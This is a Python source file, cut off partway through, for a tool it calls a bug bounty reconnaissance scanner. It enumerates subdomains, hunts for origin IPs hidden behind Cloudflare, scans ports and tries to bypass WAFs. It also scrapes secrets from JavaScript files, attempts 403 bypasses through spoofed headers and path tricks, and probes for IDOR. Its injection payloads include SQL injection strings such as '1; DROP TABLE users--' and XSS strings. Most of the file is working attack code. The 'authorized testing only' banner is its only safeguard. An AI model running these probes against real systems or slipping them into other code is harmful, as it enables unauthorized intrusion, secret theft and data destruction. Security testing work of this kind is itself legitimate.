#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║           ADVANCED BUG BOUNTY RECONNAISSANCE TOOL            ║
║         For Authorized Security Testing Only                 ║
╚══════════════════════════════════════════════════════════════╝
  USE ONLY ON DOMAINS YOU HAVE EXPLICIT PERMISSION TO TEST
"""

import sys
import os
import subprocess
import json
import re
import socket
import ssl
import time
import threading
import argparse
import hashlib
import base64
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─── Color Codes ──────────────────────────────────────────────
class C:
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RESET   = '\033[0m'

def p(color, symbol, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{C.DIM}[{ts}]{C.RESET} {color}[{symbol}]{C.RESET} {msg}")

def info(m):    p(C.CYAN,    '*', m)
def success(m): p(C.GREEN,   '+', m)
def warn(m):    p(C.YELLOW,  '!', m)
def error(m):   p(C.RED,     '-', m)
def vuln(m):    p(C.MAGENTA, '♦', m)
def section(m):
    print(f"\n{C.BOLD}{C.BLUE}{'═'*60}{C.RESET}")
    print(f"{C.BOLD}{C.BLUE}  {m}{C.RESET}")
    print(f"{C.BOLD}{C.BLUE}{'═'*60}{C.RESET}\n")

# ─── Safe HTTP Wrapper ────────────────────────────────────────
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False
    warn("requests not installed. Run: pip3 install requests")

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
}

def safe_get(url, timeout=10, allow_redirects=True, headers=None, **kwargs):
    if not REQUESTS_OK:
        return None
    try:
        h = {**HEADERS, **(headers or {})}
        r = requests.get(url, headers=h, timeout=timeout,
                         verify=False, allow_redirects=allow_redirects, **kwargs)
        return r
    except Exception:
        return None

def safe_post(url, data=None, json_data=None, timeout=10, headers=None, **kwargs):
    if not REQUESTS_OK:
        return None
    try:
        h = {**HEADERS, **(headers or {})}
        r = requests.post(url, data=data, json=json_data, headers=h,
                          timeout=timeout, verify=False, **kwargs)
        return r
    except Exception:
        return None

# ─── Results Store ────────────────────────────────────────────
class Results:
    def __init__(self, domain):
        self.domain   = domain
        self.subdomains = []
        self.real_ips = []
        self.open_ports = {}
        self.cms = None
        self.waf = None
        self.urls = []
        self.js_files = []
        self.findings = []   # (severity, category, detail)
        self.manual_tips = []

    def add_finding(self, severity, category, detail):
        self.findings.append((severity, category, detail))
        color = {
            'CRITICAL': C.RED, 'HIGH': C.RED,
            'MEDIUM': C.YELLOW, 'LOW': C.CYAN, 'INFO': C.GREEN
        }.get(severity, C.WHITE)
        vuln(f"{color}[{severity}]{C.RESET} {C.BOLD}{category}{C.RESET}: {detail}")

    def save(self):
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = f"report_{self.domain}_{ts}.json"
        data = {
            'domain':     self.domain,
            'timestamp':  ts,
            'subdomains': self.subdomains,
            'real_ips':   self.real_ips,
            'open_ports': self.open_ports,
            'cms':        self.cms,
            'waf':        self.waf,
            'urls':       self.urls[:200],
            'js_files':   self.js_files,
            'findings':   self.findings,
        }
        with open(path, 'w') as f:
            json.dump(data, f, indent=2)
        success(f"Report saved → {path}")
        return path

# ══════════════════════════════════════════════════════════════
# 1. SUBDOMAIN ENUMERATION
# ══════════════════════════════════════════════════════════════
class SubdomainFinder:
    WORDLIST = [
        'www','mail','ftp','api','dev','stage','staging','test','beta','admin',
        'portal','dashboard','app','mobile','m','secure','vpn','remote','cdn',
        'static','assets','media','images','img','upload','uploads','files',
        'docs','help','support','blog','shop','store','payment','pay','checkout',
        'login','auth','oauth','sso','account','accounts','user','users','profile',
        'api2','api-v2','v1','v2','v3','internal','intranet','corp','corporate',
        'jenkins','gitlab','github','jira','confluence','wiki','monitor','grafana',
        'prometheus','kibana','elastic','redis','mysql','db','database','smtp',
        'pop','imap','webmail','mx','ns1','ns2','dns','backup','old','new',
        'sandbox','demo','uat','qa','preprod','production','prod','live',
        'gateway','proxy','lb','loadbalancer','cloud','aws','azure','gcp',
        'git','svn','repo','registry','hub','docker','k8s','kubernetes',
    ]

    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("SUBDOMAIN ENUMERATION")
        found = set()

        # DNS Brute-force
        info("DNS brute-force wordlist...")
        with ThreadPoolExecutor(max_workers=50) as ex:
            futs = {ex.submit(self._resolve, f"{w}.{self.domain}"): w for w in self.WORDLIST}
            for fut in as_completed(futs):
                sub, ips = fut.result()
                if ips:
                    found.add(sub)
                    success(f"  {sub} → {', '.join(ips)}")

        # Certificate Transparency (crt.sh)
        info("Certificate Transparency logs (crt.sh)...")
        ct_subs = self._crt_sh()
        for s in ct_subs:
            if s not in found:
                _, ips = self._resolve(s)
                if ips:
                    found.add(s)
                    success(f"  {s} → {', '.join(ips)} [CT]")

        # ThreatCrowd / HackerTarget
        info("HackerTarget API...")
        ht = self._hackertarget()
        for s in ht:
            if s not in found:
                _, ips = self._resolve(s)
                if ips:
                    found.add(s)
                    success(f"  {s} [HackerTarget]")

        self.results.subdomains = list(found)
        info(f"Total subdomains found: {C.BOLD}{len(found)}{C.RESET}")
        return list(found)

    def _resolve(self, host):
        try:
            info_list = socket.getaddrinfo(host, None)
            ips = list({i[4][0] for i in info_list})
            return host, ips
        except Exception:
            return host, []

    def _crt_sh(self):
        subs = set()
        try:
            r = safe_get(f"https://crt.sh/?q=%.{self.domain}&output=json", timeout=15)
            if r and r.status_code == 200:
                for entry in r.json():
                    name = entry.get('name_value', '')
                    for n in name.split('\n'):
                        n = n.strip().lstrip('*.')
                        if n.endswith(self.domain):
                            subs.add(n)
        except Exception:
            pass
        return subs

    def _hackertarget(self):
        subs = set()
        try:
            r = safe_get(f"https://api.hackertarget.com/hostsearch/?q={self.domain}", timeout=10)
            if r and r.status_code == 200:
                for line in r.text.splitlines():
                    parts = line.split(',')
                    if parts:
                        subs.add(parts[0].strip())
        except Exception:
            pass
        return subs

# ══════════════════════════════════════════════════════════════
# 2. REAL IP FINDER (Cloudflare / WAF Bypass)
# ══════════════════════════════════════════════════════════════
class RealIPFinder:
    CLOUDFLARE_RANGES = [
        '103.21.244.', '103.22.200.', '103.31.4.', '104.16.', '104.17.',
        '104.18.', '104.19.', '104.20.', '104.21.', '108.162.',
        '141.101.64.', '141.101.65.', '162.158.', '172.64.', '172.65.',
        '172.66.', '172.67.', '173.245.48.', '188.114.96.', '188.114.97.',
        '190.93.240.', '190.93.241.', '197.234.240.', '198.41.128.',
    ]

    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("REAL IP DISCOVERY")
        found_ips = set()

        # Direct DNS
        try:
            ips = socket.gethostbyname_ex(self.domain)[2]
            for ip in ips:
                found_ips.add(ip)
                if self._is_cloudflare(ip):
                    warn(f"  {ip} → Behind Cloudflare/WAF (trying bypass...)")
                else:
                    success(f"  Direct IP: {ip}")
        except Exception:
            pass

        # SecurityTrails / Shodan historical (via HackerTarget)
        info("Checking historical DNS records...")
        try:
            r = safe_get(f"https://api.hackertarget.com/dnslookup/?q={self.domain}", timeout=10)
            if r and r.status_code == 200:
                for line in r.text.splitlines():
                    ip_match = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line)
                    for ip in ip_match:
                        if not self._is_cloudflare(ip) and not ip.startswith('127.'):
                            found_ips.add(ip)
                            success(f"  Historical IP: {ip}")
        except Exception:
            pass

        # MX record trick
        info("Checking MX/TXT records for origin IP leak...")
        try:
            r = safe_get(f"https://api.hackertarget.com/dnslookup/?q={self.domain}", timeout=10)
            if r:
                ips_in_txt = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', r.text)
                for ip in ips_in_txt:
                    if not self._is_cloudflare(ip):
                        found_ips.add(ip)
        except Exception:
            pass

        # Subdomains that might bypass WAF
        info("Checking subdomains for unprotected origin...")
        bypass_subs = ['direct.', 'origin.', 'old.', 'dev.', 'staging.', 'backup.', 'ftp.', 'smtp.', 'mail.', 'cpanel.']
        for s in bypass_subs:
            try:
                target = f"{s}{self.domain}"
                ips = socket.gethostbyname_ex(target)[2]
                for ip in ips:
                    if not self._is_cloudflare(ip):
                        found_ips.add(ip)
                        success(f"  Origin leak via {target}: {ip}")
            except Exception:
                pass

        self.results.real_ips = list(found_ips)
        info(f"Unique IPs discovered: {len(found_ips)}")
        return list(found_ips)

    def _is_cloudflare(self, ip):
        return any(ip.startswith(r) for r in self.CLOUDFLARE_RANGES)

# ══════════════════════════════════════════════════════════════
# 3. PORT SCANNER
# ══════════════════════════════════════════════════════════════
class PortScanner:
    TOP_PORTS = [
        21,22,23,25,53,80,110,143,443,445,465,587,993,995,
        1433,1521,2375,2376,3000,3306,3389,4369,5432,5900,
        6379,6443,7001,7002,8000,8008,8080,8081,8082,8083,
        8090,8443,8888,9000,9090,9200,9300,11211,27017,27018
    ]

    SERVICE_NAMES = {
        21:'FTP', 22:'SSH', 23:'Telnet', 25:'SMTP', 53:'DNS',
        80:'HTTP', 110:'POP3', 143:'IMAP', 443:'HTTPS', 445:'SMB',
        1433:'MSSQL', 1521:'Oracle', 2375:'Docker', 3000:'Dev/Grafana',
        3306:'MySQL', 3389:'RDP', 5432:'PostgreSQL', 5900:'VNC',
        6379:'Redis', 7001:'WebLogic', 8080:'HTTP-Alt', 8443:'HTTPS-Alt',
        9200:'Elasticsearch', 9300:'Elasticsearch', 11211:'Memcached',
        27017:'MongoDB',
    }

    def __init__(self, target, results):
        self.target  = target
        self.results = results

    def run(self):
        section("PORT SCANNING")
        open_ports = {}
        info(f"Scanning {len(self.TOP_PORTS)} common ports on {self.target}...")

        def check_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1.5)
                    result = s.connect_ex((self.target, port))
                    if result == 0:
                        banner = self._grab_banner(s, port)
                        return port, banner
            except Exception:
                pass
            return port, None

        with ThreadPoolExecutor(max_workers=100) as ex:
            futs = {ex.submit(check_port, p): p for p in self.TOP_PORTS}
            for fut in as_completed(futs):
                port, banner = fut.result()
                if banner is not None:
                    svc = self.SERVICE_NAMES.get(port, 'Unknown')
                    open_ports[port] = {'service': svc, 'banner': banner}
                    success(f"  {C.BOLD}{port}/tcp{C.RESET} OPEN  [{svc}]  {banner[:60] if banner else ''}")
                    self._check_dangerous_port(port, svc)

        self.results.open_ports[self.target] = open_ports
        return open_ports

    def _grab_banner(self, sock, port):
        try:
            sock.settimeout(2)
            banner = sock.recv(1024).decode(errors='ignore').strip()
            return banner
        except Exception:
            return ''

    def _check_dangerous_port(self, port, svc):
        dangerous = {
            2375: ('CRITICAL', 'Exposed Docker API - RCE possible'),
            6379: ('HIGH',     'Redis exposed - likely no auth'),
            9200: ('HIGH',     'Elasticsearch exposed - data leak'),
            27017:('HIGH',     'MongoDB exposed - likely no auth'),
            11211:('HIGH',     'Memcached exposed'),
            7001: ('CRITICAL', 'WebLogic - check for CVE-2020-14882'),
            3389: ('HIGH',     'RDP exposed - brute force risk'),
        }
        if port in dangerous:
            sev, msg = dangerous[port]
            self.results.add_finding(sev, f'Dangerous Port {port}', msg)

# ══════════════════════════════════════════════════════════════
# 4. WAF DETECTION
# ══════════════════════════════════════════════════════════════
class WAFDetector:
    WAF_SIGNATURES = {
        'Cloudflare':       ['cloudflare', 'cf-ray', '__cfduid', 'cf-cache-status'],
        'Akamai':           ['akamai', 'akamaighost', 'x-check-cacheable'],
        'AWS WAF':          ['awswaf', 'x-amzn-requestid', 'x-amz-cf-id'],
        'Sucuri':           ['sucuri', 'x-sucuri-id', 'x-sucuri-cache'],
        'Incapsula':        ['incapsula', 'visid_incap', 'incap_ses'],
        'F5 BIG-IP':        ['bigip', 'ts', 'f5'],
        'ModSecurity':      ['mod_security', 'modsecurity', 'NOYB'],
        'Barracuda':        ['barra', 'barracuda'],
        'Fortinet':         ['fortigate', 'fortweb'],
        'Imperva':          ['imperva', 'x-iinfo'],
    }

    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("WAF DETECTION & BYPASS")
        base_url = f"https://{self.domain}"
        waf_detected = None

        r = safe_get(base_url)
        if r:
            headers_str = str(r.headers).lower()
            cookies_str = str(r.cookies).lower()
            body_str    = r.text[:2000].lower()
            combined    = headers_str + cookies_str + body_str

            for waf, sigs in self.WAF_SIGNATURES.items():
                if any(s in combined for s in sigs):
                    waf_detected = waf
                    warn(f"  WAF Detected: {C.BOLD}{waf}{C.RESET}")
                    break

            if not waf_detected:
                success("  No WAF detected (or custom WAF)")

        # Test WAF bypass payloads
        info("Testing WAF bypass techniques...")
        bypass_payloads = [
            f"{base_url}/?id=1'",
            f"{base_url}/?q=<script>alert(1)</script>",
        ]
        for payload_url in bypass_payloads:
            r2 = safe_get(payload_url, headers={'X-Forwarded-For': '127.0.0.1'})
            if r2 and r2.status_code not in [403, 406, 419, 429]:
                success(f"  Bypass with X-Forwarded-For: 127.0.0.1 → {r2.status_code}")

        self.results.waf = waf_detected
        return waf_detected

# ══════════════════════════════════════════════════════════════
# 5. CMS DETECTION
# ══════════════════════════════════════════════════════════════
class CMSDetector:
    SIGNATURES = {
        'WordPress':  ['/wp-login.php', '/wp-admin/', '/wp-content/', '/xmlrpc.php'],
        'Joomla':     ['/administrator/', '/components/', '/modules/', 'Joomla!'],
        'Drupal':     ['/sites/default/', 'Drupal.settings', '/misc/drupal.js'],
        'Magento':    ['/skin/frontend/', '/js/mage/', 'Mage.Cookies'],
        'Shopify':    ['cdn.shopify.com', 'Shopify.theme'],
        'Laravel':    ['laravel_session', 'X-RateLimit', 'laravel'],
        'Django':     ['csrfmiddlewaretoken', 'django', 'sessionid'],
        'Flask':      ['Werkzeug', 'Flask', 'session='],
        'Express.js': ['X-Powered-By: Express', 'connect.sid'],
        'Spring':     ['JSESSIONID', 'X-Application-Context', '.do?'],
    }

    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("CMS & TECHNOLOGY FINGERPRINTING")
        base = f"https://{self.domain}"
        detected = []

        r = safe_get(base)
        if not r:
            r = safe_get(f"http://{self.domain}")
        if not r:
            error("Could not reach target")
            return None

        headers_str = str(r.headers)
        body        = r.text[:5000]
        combined    = (headers_str + body).lower()

        # Server header
        server = r.headers.get('Server', '')
        powered = r.headers.get('X-Powered-By', '')
        if server:
            info(f"  Server: {server}")
            self.results.add_finding('INFO', 'Server Header', server)
        if powered:
            info(f"  X-Powered-By: {powered}")
            self.results.add_finding('LOW', 'Technology Disclosure', powered)

        # CMS checks
        for cms, sigs in self.SIGNATURES.items():
            if any(s.lower() in combined for s in sigs):
                detected.append(cms)
                success(f"  CMS/Framework: {C.BOLD}{cms}{C.RESET}")
                self._cms_specific_checks(cms)

        # Check interesting paths
        interesting = [
            ('.git/config', 'CRITICAL', 'Git repo exposed'),
            ('.env',        'CRITICAL', 'Environment file exposed'),
            ('phpinfo.php', 'HIGH',     'PHP info exposed'),
            ('robots.txt',  'INFO',     'Robots.txt found'),
            ('sitemap.xml', 'INFO',     'Sitemap found'),
            ('crossdomain.xml', 'LOW',  'Crossdomain policy found'),
            ('.htaccess',   'MEDIUM',   '.htaccess accessible'),
            ('backup.zip',  'CRITICAL', 'Backup archive exposed'),
            ('backup.sql',  'CRITICAL', 'Database backup exposed'),
            ('config.php',  'HIGH',     'Config file accessible'),
            ('web.config',  'HIGH',     'Web.config accessible'),
            ('composer.json','LOW',     'Composer config exposed'),
            ('package.json', 'LOW',     'Package.json exposed'),
            ('Dockerfile',  'MEDIUM',   'Dockerfile exposed'),
        ]
        info("Checking sensitive paths...")
        for path, sev, msg in interesting:
            r2 = safe_get(f"{base}/{path}", allow_redirects=False)
            if r2 and r2.status_code in [200, 206]:
                self.results.add_finding(sev, 'Sensitive File', f"{path} → {msg}")

        self.results.cms = detected
        return detected

    def _cms_specific_checks(self, cms):
        base = f"https://{self.domain}"
        if cms == 'WordPress':
            paths = ['/wp-login.php', '/xmlrpc.php', '/wp-json/wp/v2/users', '/wp-content/debug.log']
            for p in paths:
                r = safe_get(base + p, allow_redirects=False)
                if r and r.status_code == 200:
                    self.results.add_finding('MEDIUM', 'WordPress', f"Accessible: {p}")
            # User enumeration via REST API
            r = safe_get(f"{base}/wp-json/wp/v2/users")
            if r and r.status_code == 200 and '[' in r.text:
                self.results.add_finding('HIGH', 'WordPress User Enum', '/wp-json/wp/v2/users reveals user list')

        elif cms == 'Joomla':
            r = safe_get(f"{base}/administrator/")
            if r and r.status_code == 200:
                self.results.add_finding('MEDIUM', 'Joomla', 'Admin panel accessible at /administrator/')

# ══════════════════════════════════════════════════════════════
# 6. URL & ENDPOINT GATHERING
# ══════════════════════════════════════════════════════════════
class URLGatherer:
    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results
        self.visited = set()
        self.urls    = set()

    def run(self):
        section("URL & ENDPOINT GATHERING")
        base = f"https://{self.domain}"

        # Wayback Machine
        info("Fetching Wayback Machine URLs...")
        self._wayback(self.domain)

        # Spider first page
        info("Spidering target...")
        self._spider(base, depth=2)

        # Interesting parameter URLs
        param_urls = [u for u in self.urls if '?' in u]
        success(f"  URLs with parameters: {len(param_urls)}")
        success(f"  Total URLs gathered: {len(self.urls)}")

        self.results.urls = list(self.urls)[:500]
        return list(self.urls)

    def _wayback(self, domain):
        try:
            r = safe_get(
                f"https://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey&limit=500",
                timeout=20
            )
            if r and r.status_code == 200:
                for row in r.json()[1:]:
                    url = row[0]
                    self.urls.add(url)
                    self.results.urls.append(url)
                success(f"  Wayback: {len(self.urls)} historical URLs")
        except Exception:
            pass

    def _spider(self, url, depth=2):
        if depth == 0 or url in self.visited or len(self.visited) > 150:
            return
        self.visited.add(url)

        r = safe_get(url, timeout=8)
        if not r:
            return

        # Extract all links
        links = re.findall(r'href=["\']([^"\']+)["\']', r.text)
        srcs  = re.findall(r'src=["\']([^"\']+)["\']', r.text)
        actions = re.findall(r'action=["\']([^"\']+)["\']', r.text)

        for link in links + srcs + actions:
            if link.startswith('http'):
                full = link
            elif link.startswith('/'):
                full = f"https://{self.domain}{link}"
            else:
                continue

            if self.domain in full:
                self.urls.add(full)
                if depth > 1 and '?' not in full:
                    self._spider(full, depth - 1)

# ══════════════════════════════════════════════════════════════
# 7. JS FILE ANALYSIS
# ══════════════════════════════════════════════════════════════
class JSAnalyzer:
    SECRETS_PATTERNS = [
        (r'api[_-]?key["\s]*[:=]["\s]*([A-Za-z0-9_\-]{20,})', 'API Key'),
        (r'secret["\s]*[:=]["\s]*([A-Za-z0-9_\-]{20,})',       'Secret'),
        (r'password["\s]*[:=]["\s]*([^"\'\s]{8,})',             'Password'),
        (r'token["\s]*[:=]["\s]*([A-Za-z0-9_.\-]{20,})',        'Token'),
        (r'aws_access_key_id["\s]*[:=]["\s]*([A-Z0-9]{20})',    'AWS Key'),
        (r'AKIA[0-9A-Z]{16}',                                   'AWS Access Key'),
        (r'private_key["\s]*[:=]["\s]*([^"\']{20,})',           'Private Key'),
        (r'client_secret["\s]*[:=]["\s]*([^"\']{20,})',         'OAuth Secret'),
        (r'firebase[^"\']*["\s]*[:=]["\s]*([^"\']{20,})',       'Firebase Config'),
        (r'mongodb\+srv://[^"\'>\s]+',                          'MongoDB URI'),
        (r'postgres://[^"\'>\s]+',                              'PostgreSQL URI'),
        (r'redis://[^"\'>\s]+',                                 'Redis URI'),
        (r'Bearer\s+([A-Za-z0-9_\-\.]{30,})',                   'Bearer Token'),
        (r'Basic\s+([A-Za-z0-9+/]{20,}={0,2})',                 'Basic Auth'),
        (r'-----BEGIN [A-Z ]+PRIVATE KEY-----',                 'Private Key Block'),
    ]

    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("JS FILE ANALYSIS")
        js_urls = [u for u in self.results.urls if u.endswith('.js')]

        # Also check standard paths
        base = f"https://{self.domain}"
        for path in ['/app.js', '/main.js', '/bundle.js', '/static/js/main.chunk.js',
                     '/assets/index.js', '/dist/app.js', '/js/app.js']:
            r = safe_get(base + path, allow_redirects=False)
            if r and r.status_code == 200:
                js_urls.append(base + path)

        js_urls = list(set(js_urls))[:30]
        info(f"Analyzing {len(js_urls)} JS files...")
        self.results.js_files = js_urls

        endpoints_found = set()
        for js_url in js_urls:
            r = safe_get(js_url, timeout=10)
            if not r:
                continue

            content = r.text

            # Find hidden endpoints
            apis = re.findall(r'["\'](/api/[^"\'<>\s]{3,})["\']', content)
            apis += re.findall(r'["\'](https?://[^"\'<>\s]{10,})["\']', content)
            for api in apis:
                endpoints_found.add(api)

            # Find secrets
            for pattern, name in self.SECRETS_PATTERNS:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    snippet = match[:60] if isinstance(match, str) else match[0][:60]
                    self.results.add_finding('HIGH', f'Secret in JS: {name}',
                                            f"{js_url} → {snippet}...")

        if endpoints_found:
            success(f"  Hidden API endpoints found: {len(endpoints_found)}")
            for ep in list(endpoints_found)[:20]:
                info(f"    {ep}")
            self.results.urls.extend(list(endpoints_found))

# ══════════════════════════════════════════════════════════════
# 8. AUTHENTICATION TESTING
# ══════════════════════════════════════════════════════════════
class AuthTester:
    BYPASS_HEADERS = [
        {'X-Original-URL': '/admin'},
        {'X-Rewrite-URL': '/admin'},
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Custom-IP-Authorization': '127.0.0.1'},
        {'X-Forwarded-Host': 'localhost'},
        {'Forwarded': 'for=127.0.0.1;proto=http;by=127.0.0.1'},
        {'X-ProxyUser-Ip': '127.0.0.1'},
    ]

    COMMON_CREDS = [
        ('admin','admin'), ('admin','password'), ('admin','123456'),
        ('admin','admin123'), ('root','root'), ('root','toor'),
        ('admin',''), ('administrator','administrator'),
        ('test','test'), ('guest','guest'), ('user','user'),
    ]

    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("AUTHENTICATION BYPASS TESTING")
        base = f"https://{self.domain}"

        admin_paths = [
            '/admin', '/admin/', '/admin/login', '/administrator',
            '/wp-admin', '/dashboard', '/panel', '/cpanel',
            '/manager', '/management', '/backend', '/control',
            '/login', '/signin', '/auth', '/user/login',
            '/api/admin', '/console', '/webadmin',
        ]

        info("Testing 403/401 bypass techniques...")
        for path in admin_paths[:10]:
            url = base + path
            r = safe_get(url, allow_redirects=False)
            if r and r.status_code in [401, 403]:
                # Try header bypass
                for bypass_hdr in self.BYPASS_HEADERS:
                    r2 = safe_get(url, headers=bypass_hdr, allow_redirects=False)
                    if r2 and r2.status_code not in [401, 403, 404]:
                        self.results.add_finding(
                            'HIGH', 'Auth Bypass',
                            f"Bypassed {path} with header {list(bypass_hdr.keys())[0]} → HTTP {r2.status_code}"
                        )

                # Path bypass tricks
                bypass_paths = [
                    path + '/', path + '//', path + '/.',
                    path + '%2f', path.upper(),
                    '/.' + path, path + '?anything',
                    path + '#', path + '..;/',
                ]
                for bp in bypass_paths:
                    r3 = safe_get(base + bp, allow_redirects=False)
                    if r3 and r3.status_code not in [401, 403, 404]:
                        self.results.add_finding(
                            'HIGH', 'Path Bypass',
                            f"Bypassed {path} using {bp} → HTTP {r3.status_code}"
                        )

        # Default credentials check
        info("Testing default credentials on login forms...")
        login_paths = ['/login', '/admin/login', '/wp-login.php', '/user/login']
        for lpath in login_paths:
            r = safe_get(base + lpath)
            if r and r.status_code == 200 and 'password' in r.text.lower():
                info(f"  Login form found at {lpath} - test default creds manually")
                self.results.add_finding('INFO', 'Login Form', f"Found at {lpath}")

        # JWT weaknesses check
        info("Checking for JWT tokens...")
        r = safe_get(base + '/api/user/profile')
        if r:
            auth_hdr = r.headers.get('Authorization', '')
            set_cookie = r.headers.get('Set-Cookie', '')
            if 'eyJ' in auth_hdr or 'eyJ' in set_cookie or 'eyJ' in r.text[:1000]:
                self.results.add_finding('MEDIUM', 'JWT Found',
                    'JWT token detected - test: alg:none, weak secret, algorithm confusion')

# ══════════════════════════════════════════════════════════════
# 9. IDOR & ACCESS CONTROL
# ══════════════════════════════════════════════════════════════
class IDORTester:
    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("IDOR & BROKEN ACCESS CONTROL")
        base = f"https://{self.domain}"

        # Find parameter URLs with IDs
        id_urls = []
        for url in self.results.urls:
            if re.search(r'[?&](id|user_id|account|order|invoice|doc|file|ticket|record)=\d+', url, re.I):
                id_urls.append(url)

        info(f"Testing {min(len(id_urls), 20)} ID-based endpoints for IDOR...")

        for url in id_urls[:20]:
            # Try ID manipulation
            original = safe_get(url)
            if not original:
                continue

            # Replace ID with neighbors
            for delta in [1, -1, 2, 0, 999, 9999]:
                modified = re.sub(r'(\b(?:id|user_id|account|order)=)(\d+)',
                                  lambda m: m.group(1) + str(max(1, int(m.group(2)) + delta)),
                                  url, flags=re.I)
                if modified == url:
                    continue
                r2 = safe_get(modified)
                if r2 and r2.status_code == 200 and len(r2.text) > 100:
                    self.results.add_finding('HIGH', 'Potential IDOR',
                        f"ID manipulation → 200 OK: {modified[:80]}")
                    break

        # Common IDOR patterns
        idor_paths = [
            '/api/users/1', '/api/users/2',
            '/api/account/1', '/api/orders/1',
            '/api/v1/users/1', '/api/v1/profile/1',
            '/user/1/profile', '/user/2/profile',
        ]
        info("Probing common IDOR endpoints...")
        for path in idor_paths:
            r = safe_get(base + path)
            if r and r.status_code == 200 and len(r.text) > 50:
                self.results.add_finding('MEDIUM', 'IDOR Candidate',
                    f"Unauthenticated access: {path} → {r.status_code}")

# ══════════════════════════════════════════════════════════════
# 10. SQL INJECTION TESTING
# ══════════════════════════════════════════════════════════════
class SQLInjectionTester:
    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"ORA-\d{5}",
        r"Microsoft OLE DB.*SQL Server",
        r"SQLSTATE\[",
        r"Unclosed quotation mark",
        r"Syntax error.*in query expression",
        r"pg_query\(\):.*ERROR",
        r"sqlite3\.OperationalError",
        r"You have an error in your SQL syntax",
        r"Incorrect syntax near",
        r"mysql_fetch_array\(\)",
        r"Division by zero",
    ]

    PAYLOADS = ["'", '"', "' OR '1'='1", "' OR 1=1--", "1' AND 1=1--",
                "' UNION SELECT NULL--", "admin'--", "' AND SLEEP(5)--",
                "1; DROP TABLE users--", "' OR 'x'='x"]

    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("SQL INJECTION TESTING")
        base  = f"https://{self.domain}"
        tested = 0
        found  = 0

        # Collect URLs with parameters
        param_urls = [u for u in self.results.urls if '?' in u and self.domain in u]
        info(f"Testing {min(len(param_urls), 30)} parameterized URLs for SQLi...")

        for url in param_urls[:30]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                for payload in self.PAYLOADS[:5]:  # Keep it lightweight
                    test_params = {**params, param: [payload]}
                    test_url = parsed._replace(
                        query=urlencode(test_params, doseq=True)
                    ).geturl()

                    r = safe_get(test_url, timeout=8)
                    if not r:
                        continue
                    tested += 1

                    body = r.text
                    for ep in self.ERROR_PATTERNS:
                        if re.search(ep, body, re.I):
                            self.results.add_finding('CRITICAL', 'SQL Injection',
                                f"Error-based SQLi in param [{param}] at {url[:70]}")
                            found += 1
                            break

                    # Time-based detection (basic)
                    if 'SLEEP' in payload.upper():
                        pass  # Would need timing comparison - marked for manual

        info(f"  Tested: {tested} parameter/payload combos | Found: {found} potential SQLi")

        # Also test POST forms
        info("Testing POST endpoints for SQL injection...")
        for url in self.results.urls[:10]:
            if self.domain not in url:
                continue
            r = safe_get(url)
            if not r:
                continue
            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
                               r.text, re.DOTALL | re.I)
            for action, form_body in forms[:3]:
                inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form_body, re.I)
                if inputs:
                    for payload in ["'", "' OR '1'='1"]:
                        data = {inp: payload for inp in inputs}
                        r2 = safe_post(urljoin(f"https://{self.domain}", action), data=data)
                        if r2:
                            for ep in self.ERROR_PATTERNS:
                                if re.search(ep, r2.text, re.I):
                                    self.results.add_finding('CRITICAL', 'SQL Injection (POST)',
                                        f"SQLi in form at {action}")

# ══════════════════════════════════════════════════════════════
# 11. XSS TESTING
# ══════════════════════════════════════════════════════════════
class XSSTester:
    PAYLOADS = [
        '<script>alert("XSS")</script>',
        '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>",
        '<svg onload=alert(1)>',
        '"><svg/onload=alert(1)>',
        'javascript:alert(1)',
        '<img src="x" onerror="alert(\'XSS\')">',
        '{{7*7}}', '${7*7}',  # Template injection
        '<iframe src="javascript:alert(1)">',
    ]

    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("XSS TESTING")
        param_urls = [u for u in self.results.urls if '?' in u and self.domain in u]
        info(f"Testing {min(len(param_urls), 25)} URLs for XSS...")
        found = 0

        for url in param_urls[:25]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:3]:
                for payload in self.PAYLOADS[:5]:
                    test_params = {**params, param: [payload]}
                    test_url = parsed._replace(
